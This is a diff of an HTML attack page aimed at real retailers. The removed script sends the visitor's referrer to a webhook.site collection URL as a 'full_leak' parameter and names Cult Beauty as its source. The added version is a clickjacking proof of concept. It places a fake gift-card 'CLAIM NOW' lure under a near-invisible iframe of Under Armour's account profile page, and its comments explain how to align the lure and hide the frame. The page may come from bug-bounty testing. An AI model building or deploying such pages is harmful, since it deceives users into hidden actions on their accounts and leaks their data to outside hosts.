@@ -1,21 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Processing Discount...</title>
+    <title>High Impact Clickjack PoC</title>
+    <style>
+        body { margin: 0; padding: 0; }
+        #decoy {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        #fake-btn {
+            position: absolute;
+            /* In values ko sensitive button ke upar set karein */
+            top: 310px; 
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 15px 40px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        iframe {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            opacity: 0.3; /* Test ke baad 0.0001 kar dein */
+            border: none;
+        }
+    </style>
 </head>
 <body>
-    <script>
-        var webhook = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
-        var ref = document.referrer;
-
-        // Agar referrer maujood hai (yani click karke aaye hain)
-        if (ref) {
-            window.location.href = webhook + "?full_leak=" + encodeURIComponent(ref);
-        } else {
-            document.write("<h1>Please click the link from Cult Beauty to see the leak.</h1>");
-        }
-    </script>
+    <div id="decoy">
+        <h1>CONGRATULATIONS!</h1>
+        <p>You won a $500 Gift Card. Click below to claim.</p>
+        <button id="fake-btn">CLAIM NOW</button>
+    </div>
+    <iframe src="https://www.underarmour.com/en-us/account/profile"></iframe>
 </body>
 </html>
-
-
